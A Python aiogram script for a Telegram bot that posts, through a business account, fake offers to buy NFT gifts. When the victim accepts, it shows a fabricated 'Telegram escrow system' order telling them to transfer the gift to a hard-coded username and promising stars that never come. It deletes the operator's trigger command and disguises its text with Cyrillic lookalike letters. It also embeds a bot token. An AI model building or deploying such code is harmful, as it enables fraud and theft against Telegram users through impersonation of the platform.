import asyncio
import logging
import random
import re
import string
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.types import (
    Message,
    CallbackQuery,
    BusinessConnection,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.enums import ParseMode

BOT_TOKEN = "8907245229:AAHXgJX3--CshS9p2UU7RQukzMW_Y3b8oBo"

EMOJI_STARS = "5920433463428650761"
EMOJI_GRAM = "5267445215773367585"
EMOJI_DECLINE_EN = "5774077015388852135"
EMOJI_ACCEPT = "5774022692642492953"

OFFER_USERNAME = "andantropov"
BUYER_USERNAME = "armaniiboy"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

business_owner_ids: dict[str, int] = {}
offers: dict[str, dict] = {}


@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    business_owner_ids[connection.id] = connection.user.id
    logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")


def parse_nft_link(link: str):
    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
    m = re.search(pattern, link)
    if not m:
        return None
    slug = m.group(1)
    number = m.group(2)
    full_link = f"https://t.me/nft/{slug}-{number}"
    return full_link, slug, number


def parse_offer_command(text: str):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != ".gind":
        return None
    link = parts[1]
    amount = parts[2]
    if not amount.isdigit():
        return None

    currency = "stars"
    if len(parts) > 3:
        p3 = parts[3].lower()
        if p3 in ("stars", "gram"):
            currency = p3

    parsed = parse_nft_link(link)
    if not parsed:
        return None
    full_link, slug, number = parsed

    return {
        "link": full_link,
        "gift_slug": slug,
        "gift_number": number,
        "amount": amount,
        "currency": currency,
    }


async def send_with_fallback(bc_id, chat_id, text, reply_markup):
    try:
        return await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            business_connection_id=bc_id,
            disable_web_page_preview=False,
        )
    except Exception as e:
        logger.warning(f"[send] with emoji failed: {e}, retry without")
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row:
                    btn.icon_custom_emoji_id = None
        return await bot.send_message(
            chat_id=chat_id,
            text=clean_text,
            reply_markup=reply_markup,
            business_connection_id=bc_id,
            disable_web_page_preview=False,
        )


async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    try:
        await bot.edit_message_text(
            business_connection_id=bc_id,
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup,
            disable_web_page_preview=False,
        )
        logger.info("[edit] OK")
        return True
    except Exception as e:
        logger.warning(f"[edit] with emoji failed: {e}, retry without")
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row:
                    btn.icon_custom_emoji_id = None
        try:
            await bot.edit_message_text(
                business_connection_id=bc_id,
                chat_id=chat_id,
                message_id=message_id,
                text=clean_text,
                reply_markup=reply_markup,
                disable_web_page_preview=False,
            )
            logger.info("[edit] OK (fallback)")
            return True
        except Exception as e2:
            logger.error(f"[edit] fallback failed: {e2}")
            return False


@dp.business_message(F.text.startswith(".gind"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id:
        logger.warning("[offer] no business_connection_id")
        return

    bc_id = message.business_connection_id
    data = parse_offer_command(message.text)
    if not data:
        logger.warning(f"[offer] parse failed for text: {message.text!r}")
        return

    logger.info(
        f"[offer] parsed: amount={data['amount']} "
        f"currency={data['currency']} gift={data['gift_slug']}-{data['gift_number']}"
    )

    try:
        await bot.delete_business_messages(
            business_connection_id=bc_id,
            message_ids=[message.message_id],
        )
        logger.info("[offer] команда .gind удалена")
    except Exception as e:
        logger.warning(f"[offer] delete failed: {e}")

    await asyncio.sleep(3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'

    text = (
        f"Usеr <b>{OFFER_USERNAME}</b> оffеrs уоu "
        f"<b>{amount_fmt}</b> {emoji} "
        f"fоr thе gift {gift_display}.\n\n"
        f"Тhе оffеr is vаlid fоr <b>6 h. 0 min</b>.."
    )

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        **data,
        "bc_id": bc_id,
        "chat_id": message.chat.id,
        "accepted": False,
    }

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Decline",
                    callback_data=f"dec:{offer_id}",
                    icon_custom_emoji_id=EMOJI_DECLINE_EN,
                ),
                InlineKeyboardButton(
                    text="Accept",
                    callback_data=f"acc:{offer_id}",
                    icon_custom_emoji_id=EMOJI_ACCEPT,
                ),
            ]
        ]
    )

    try:
        sent = await send_with_fallback(
            bc_id=bc_id,
            chat_id=message.chat.id,
            text=text,
            reply_markup=keyboard,
        )
        offers[offer_id]["msg_id"] = sent.message_id
        logger.info(
            f"[offer] {offer_id} отправлен в чат {message.chat.id} "
            f"(msg_id={sent.message_id})"
        )
    except Exception as e:
        logger.error(f"[offer] send failed: {e}")


@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    logger.info(f"[decline] callback: {callback.data}")
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data:
        logger.warning(f"[decline] offer {offer_id} not found")
        try:
            await callback.answer("Заявка не найдена.", show_alert=True)
        except Exception:
            pass
        return
    if data.get("accepted"):
        logger.info(f"[decline] offer {offer_id} уже принят")
        try:
            await callback.answer()
        except Exception:
            pass
        return

    decline_text = (
        f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
        f"Offer has been declined."
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=decline_text,
    )
    logger.info(f"[decline] offer {offer_id} обновлён")

    try:
        await callback.answer()
    except Exception:
        pass


@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    logger.info(f"[accept] callback: {callback.data}")
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data:
        logger.warning(f"[accept] offer {offer_id} not found")
        try:
            await callback.answer("Заявка не найдена.", show_alert=True)
        except Exception:
            pass
        return
    if data.get("accepted"):
        logger.info(f"[accept] offer {offer_id} уже принят")
        try:
            await callback.answer()
        except Exception:
            pass
        return

    data["accepted"] = True
    logger.info(
        f"[accept] offer {offer_id} currency={data['currency']} "
        f"amount={data['amount']}"
    )

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'

    rand_suffix = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=8)
    )
    order_id = f"ТG-{rand_suffix}"

    accept_text = (
        f"<b>NFТ Dеаl</b>\n\n"
        f"<b>Оrdеr</b> #{order_id}\n\n"
        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} "
        f"thrоugh thе Теlеgrаm еsсrоw sуstеm. "
        f"Тhе stаrs аrе hеld in а sресiаl еsсrоw ассоunt аnd will bе "
        f"аutоmаtiсаllу сrеditеd tо уоur Теlеgrаm Stаrs bаlаnсе "
        f"right аftеr thе gift is trаnsfеrrеd.\n\n"
        f"<b>Instruсtiоns tо соmрlеtе thе dеаl:</b>\n\n"
        f"1. Sеnd tо: @{BUYER_USERNAME}\n"
        f"2. Сliсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
        f"3. Соnfirm thе gift trаnsfеr.\n\n"
        f"Теlеgrаm will rесоrd thе trаnsасtiоn аnd instаntlу сrеdit "
        f"<b>{amount_fmt}</b> {emoji} tо уоur bаlаnсе. "
        f"Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Send Gift",
                    url=f"tg://send_gift?to={BUYER_USERNAME}",
                )
            ]
        ]
    )

    ok = await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=accept_text,
        reply_markup=keyboard,
    )
    if ok:
        logger.info(f"[accept] offer {offer_id} обновлён (edit)")
    else:
        logger.error(f"[accept] offer {offer_id} edit не удался")

    try:
        await callback.answer()
    except Exception:
        pass


async def main() -> None:
    logger.info("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
